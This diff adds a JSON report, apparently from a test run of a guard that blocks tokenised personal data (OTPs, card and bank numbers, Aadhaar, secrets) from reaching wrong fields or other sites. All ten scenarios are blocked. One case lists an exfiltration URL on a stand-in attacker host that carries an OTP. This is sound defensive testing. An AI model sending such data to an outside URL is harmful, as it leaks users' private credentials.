@@ -1,0 +1,148 @@
+{
+  "generatedAt": "2026-09-25T16:57:38.119Z",
+  "total": 10,
+  "blocked": 10,
+  "leaked": 0,
+  "results": [
+    {
+      "name": "phone-into-comment-box",
+      "blocked": true,
+      "leaked": false,
+      "findings": [
+        {
+          "token": "[PHONE_1]",
+          "type": "PHONE",
+          "category": "unknown",
+          "target": "n1",
+          "reason": "PHONE token does not belong in a \"unknown\" field"
+        }
+      ]
+    },
+    {
+      "name": "aadhaar-into-search-box",
+      "blocked": true,
+      "leaked": false,
+      "findings": [
+        {
+          "token": "[AADHAAR_1]",
+          "type": "AADHAAR",
+          "category": "unknown",
+          "target": "n1",
+          "reason": "AADHAAR token does not belong in a \"unknown\" field"
+        }
+      ]
+    },
+    {
+      "name": "email-cross-origin-replay",
+      "blocked": true,
+      "leaked": false,
+      "findings": [
+        {
+          "token": "[EMAIL_1]",
+          "type": "EMAIL",
+          "category": "email",
+          "target": "n1",
+          "reason": "EMAIL token was captured on https://trusted-site.example, not https://attacker-clone.example"
+        }
+      ]
+    },
+    {
+      "name": "cc-into-newsletter-signup",
+      "blocked": true,
+      "leaked": false,
+      "findings": [
+        {
+          "token": "[CC_1]",
+          "type": "CC",
+          "category": "email",
+          "target": "n1",
+          "reason": "CC token does not belong in a \"email\" field"
+        }
+      ]
+    },
+    {
+      "name": "bank-account-into-review-text",
+      "blocked": true,
+      "leaked": false,
+      "findings": [
+        {
+          "token": "[BANK_ACCOUNT_1]",
+          "type": "BANK_ACCOUNT",
+          "category": "unknown",
+          "target": "n1",
+          "reason": "BANK_ACCOUNT token does not belong in a \"unknown\" field"
+        }
+      ]
+    },
+    {
+      "name": "otp-exfil-via-navigate-url",
+      "blocked": true,
+      "leaked": false,
+      "findings": [
+        {
+          "token": "[OTP_1]",
+          "type": "OTP",
+          "category": "url",
+          "target": "https://attacker.example/collect?otp=[OTP_1]",
+          "reason": "OTP token would leave the device inside a URL — never allowed"
+        }
+      ]
+    },
+    {
+      "name": "name-into-unrelated-hidden-field-cross-origin",
+      "blocked": true,
+      "leaked": false,
+      "findings": [
+        {
+          "token": "[NAME_1]",
+          "type": "NAME",
+          "category": "unknown",
+          "target": "n1",
+          "reason": "NAME token does not belong in a \"unknown\" field"
+        }
+      ]
+    },
+    {
+      "name": "address-into-message-box",
+      "blocked": true,
+      "leaked": false,
+      "findings": [
+        {
+          "token": "[ADDRESS_1]",
+          "type": "ADDRESS",
+          "category": "unknown",
+          "target": "n1",
+          "reason": "ADDRESS token does not belong in a \"unknown\" field"
+        }
+      ]
+    },
+    {
+      "name": "secret-token-into-any-field",
+      "blocked": true,
+      "leaked": false,
+      "findings": [
+        {
+          "token": "[SECRET_1]",
+          "type": "SECRET",
+          "category": "unknown",
+          "target": "n1",
+          "reason": "SECRET token does not belong in a \"unknown\" field"
+        }
+      ]
+    },
+    {
+      "name": "fill-form-mixed-with-one-attack-field",
+      "blocked": true,
+      "leaked": false,
+      "findings": [
+        {
+          "token": "[PHONE_1]",
+          "type": "PHONE",
+          "category": "unknown",
+          "target": "n2",
+          "reason": "PHONE token does not belong in a \"unknown\" field"
+        }
+      ]
+    }
+  ]
+}
